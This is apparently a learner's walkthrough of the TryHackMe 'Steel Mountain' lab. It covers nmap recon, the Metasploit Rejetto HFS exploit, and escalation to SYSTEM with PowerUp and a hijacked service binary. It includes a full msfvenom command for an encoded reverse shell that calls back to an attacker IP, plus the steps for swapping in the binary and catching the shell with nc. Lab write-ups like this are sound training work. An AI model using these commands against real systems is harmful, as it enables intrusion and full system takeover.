# Steel Mountain — TryHackMe — SYSTEM

**Date:** 2026-09-22
**Platform:** TryHackMe
**Outcome:** NT AUTHORITY\SYSTEM — **machine 12, walkthrough-guided completion (Phase B)**
**Time:** 55m · Confidence self-rated 3/5
**Tools:** nmap, Metasploit (rejetto_hfs_exec), meterpreter (upload, powershell_shell),
PowerUp (Invoke-AllChecks), msfvenom (`-f exe-service`), sc.exe, nc

---

## 0. TL;DR chain

nmap (IIS 8.5 · SMB · WinRM · **8080 Rejetto HFS 2.3.x**) → CVE for HFS 2.3.x (RCE) →
Metasploit `exploit/windows/http/rejetto_hfs_exec` (rank: excellent — self-staging, one
terminal) → **meterpreter as bill** → `upload PowerUp.ps1` → `load powershell` →
`powershell_shell` → `. .\PowerUp.ps1; Invoke-AllChecks` → **AdvancedSystemCareService9**
(LocalSystem + writable binary + CanRestart:True) → `msfvenom -f exe-service` →
`sc.exe stop` → delete original → `upload` → `sc.exe start` → nc listener on 2222 →
**NT AUTHORITY\SYSTEM**

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| 80 | IIS 8.5 | default web | employee-of-the-month page (reverse image → Bill Harper) |
| 139 / 445 | SMB | file sharing | enumerated, not the door |
| 5985 | WinRM | PS remoting | door for later creds |
| **8080** | **Rejetto HFS 2.3.x** | niche file-transfer web app | **the attack surface — CVE territory** |

## 2. Vulnerability assessment

Rejetto HTTP File Server 2.3.x — remote code execution. Day-one lesson held: the version
string decides the CVE (2.3m ≠ 2.3.x burned an hour on attempt one). This run: found the
service, named the version, went straight to the matching module.

## 3. Foothold (meterpreter, one terminal)

`search rejetto` → `exploit/windows/http/rejetto_hfs_exec`, rank **excellent**.
RHOSTS + RPORT 8080 + LHOST → `run` → `Meterpreter session 1 opened` as bill.

**Why one terminal is enough:** the module *is* the whole staging chain. `SRVHOST/SRVPORT`
in its options are the tell — it spins up its own web server to deliver the payload, fires
the exploit, and catches the callback with its own handler. (A fully manual route exists —
public py trigger + staged PowerShell script + separate listener — worth knowing because
OSCP restricts Metasploit; for this room, the module is the intended path.)

## 4. Privilege escalation (the service hijack, done right)

1. **Did:** `upload PowerUp.ps1` (meterpreter's scp) → `load powershell` →
   `powershell_shell` → **dot-source** the script (`. .\PowerUp.ps1` — the leading dot loads
   its functions into the current session) → `Invoke-AllChecks`.

2. **Did:** read the audit with the three-column filter:
   - `StartName : LocalSystem` — runs as SYSTEM
   - `ModifiableFile` (bill) — binary is writable
   - `CanRestart : True` — restartable by us
   → **AdvancedSystemCareService9**. (The other writable services: CanRestart False = dead
   ends.)

3. **Did:** forge a replacement — and this is the key that unlocked the whole room:
   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.48 LPORT=2222 \
     -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
   ```
   **`-f exe-service`, not `-f exe`:** the output speaks the Windows service handshake
   (StartServiceCtrlDispatcher), so the SCM sees a *well-behaved service*, keeps it running,
   and never kills the payload. A plain `-f exe` never speaks the handshake — the SCM
   executes it, waits, gets silence, and kills the process. That single flag is the
   difference between a dead payload and a stable SYSTEM shell.

4. **Did:** `sc.exe stop AdvancedSystemCareService9` → delete original → `upload ASCService.exe`
   into the service path → `sc.exe start` → nc listener on 2222 →
   `whoami` → **nt authority\system**.

## 5. Misses and dead ends

- **First forged exe (`Advanced.exe`, LPORT 4443) never called back**, and the retry hit
  "port already in use" — a stale nc listener was still holding the port. Countermeasure:
  kill the old listener before reusing a port (`Ctrl+C` the terminal or `ss -tlnp` to check),
  and keep the payload filename identical to the service binary to avoid swap confusion.

## 6. Lessons

1. **`-f exe-service` for service hijacks** — the payload must speak SCM, or SCM kills it.
   Plain exe = migrate race or boot tricks; exe-service = stable SYSTEM.
2. **The hijack trinity:** StartName LocalSystem + writable binary + CanRestart. All three
   or no play.
3. **Module vs manual:** `SRVHOST/SRVPORT` reveal a module that self-stages. eJPT allows
   Metasploit; OSCP restricts it — the manual equivalents (stage-serve-listen) stay worth
   knowing.
4. **Dot-sourcing (`. .\script.ps1`)** loads functions into the session; running without the
   dot executes and forgets. `load powershell` + `powershell_shell` = PowerShell inside
   meterpreter.
5. **One listener per port** — "address already in use" is a ghost of your own making.
